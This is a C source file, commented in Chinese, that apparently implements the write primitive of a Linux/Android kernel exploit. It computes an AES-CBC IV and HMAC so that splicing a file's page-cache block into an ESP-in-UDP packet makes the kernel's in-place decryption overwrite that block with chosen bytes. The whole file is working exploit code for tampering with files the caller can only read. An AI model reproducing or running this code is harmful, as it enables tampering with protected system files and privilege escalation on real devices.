/*
 * splice/vmsplice 组装并发送 ESP-in-UDP 报文。见 dfr_splice.h 的说明。
 */
#include "dfr_splice.h"

#include <errno.h>
#include <string.h>
#include <unistd.h>

#include <fcntl.h>
#include <sys/socket.h>
#include <sys/uio.h>

#include "aes256.h"
#include "dfr_sha256.h"

#define ESP_HDR_LEN 8   /* SPI + Seq */
#define ESP_IV_LEN 16
#define ESP_BLOCK 16    /* 一个 AES 块，也是本实现改写的粒度 */

static void put_be32(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)(v >> 24);
    p[1] = (uint8_t)(v >> 16);
    p[2] = (uint8_t)(v >> 8);
    p[3] = (uint8_t)v;
}

/*
 * 反推 IV，使内核解密结果等于 desired。
 *     plaintext = AES_DEC(key, C_old) XOR IV   （ESP/CBC）
 *     => IV = AES_DEC(key, C_old) XOR desired
 */
static void compute_iv(const uint8_t aes_key[32],
                       const uint8_t old_content[16],
                       const uint8_t desired[16],
                       uint8_t iv[16]) {
    uint8_t dec[16];
    aes256_ecb_decrypt(aes_key, old_content, dec);
    for (int i = 0; i < 16; i++) iv[i] = (uint8_t)(dec[i] ^ desired[i]);
}

int dfr_write_block16(int udp_fd, int file_fd, off_t offset,
                      uint32_t spi, uint32_t seq,
                      const uint8_t aes_key[32],
                      const uint8_t *auth_key, size_t auth_key_len,
                      int icv_len,
                      const uint8_t desired[16]) {
    if (icv_len < 0 || icv_len > 32) return -EINVAL;

    /* 1) 读目标块当前内容：它既是「密文」，也是算 ICV 的输入。 */
    uint8_t old_content[ESP_BLOCK];
    ssize_t got = pread(file_fd, old_content, sizeof(old_content), offset);
    if (got != (ssize_t)sizeof(old_content)) return -EIO;

    /* 2) 反推 IV。 */
    uint8_t iv[ESP_IV_LEN];
    compute_iv(aes_key, old_content, desired, iv);

    /* 3) ESP 头：SPI + Seq + IV。 */
    uint8_t hdr[ESP_HDR_LEN + ESP_IV_LEN];
    put_be32(hdr, spi);
    put_be32(hdr + 4, seq);
    memcpy(hdr + ESP_HDR_LEN, iv, ESP_IV_LEN);

    /* 4) ICV = HMAC-SHA256(认证密钥, ESP头(8) || IV(16) || 密文(16)) 截断。
     *    注意 HMAC 输入恒为 40 字节，与 authsize 无关 —— authsize 只决定
     *    随包附加多少字节（见 calibrate）。 */
    uint8_t hmac_msg[40];
    memcpy(hmac_msg, hdr, ESP_HDR_LEN);
    memcpy(hmac_msg + ESP_HDR_LEN, iv, ESP_IV_LEN);
    memcpy(hmac_msg + ESP_HDR_LEN + ESP_IV_LEN, old_content, ESP_BLOCK);
    uint8_t mac[32];
    dfr_hmac_sha256(auth_key, auth_key_len, hmac_msg, sizeof(hmac_msg), mac);

    /* 5) 用 pipe 把三段拼起来；密文段必须是 splice（保留页缓存引用）。 */
    int pfd[2];
    if (pipe(pfd) < 0) return -errno;

    int rc = 0;
    int total = ESP_HDR_LEN + ESP_IV_LEN + ESP_BLOCK + icv_len;

    struct iovec iov1 = {.iov_base = hdr, .iov_len = sizeof(hdr)};
    if (vmsplice(pfd[1], &iov1, 1, 0) != (ssize_t)sizeof(hdr)) {
        rc = -errno;
        goto out;
    }

    {
        off64_t off = (off64_t)offset; /* bionic 的 splice 原型取 off64_t */
        if (splice(file_fd, &off, pfd[1], NULL, ESP_BLOCK, SPLICE_F_MOVE) != ESP_BLOCK) {
            rc = -EIO;
            goto out;
        }
    }

    if (icv_len > 0) {
        struct iovec iov3 = {.iov_base = mac, .iov_len = (size_t)icv_len};
        if (vmsplice(pfd[1], &iov3, 1, 0) != icv_len) {
            rc = -errno;
            goto out;
        }
    }

    /* 6) pipe → UDP。一次 splice 发完整报文，内核据此构造 skb 的 frag 列表。 */
    {
        ssize_t s = splice(pfd[0], NULL, udp_fd, NULL, (size_t)total, 0);
        if (s != total) rc = -EIO;
    }

out:
    close(pfd[0]);
    close(pfd[1]);
    return rc;
}
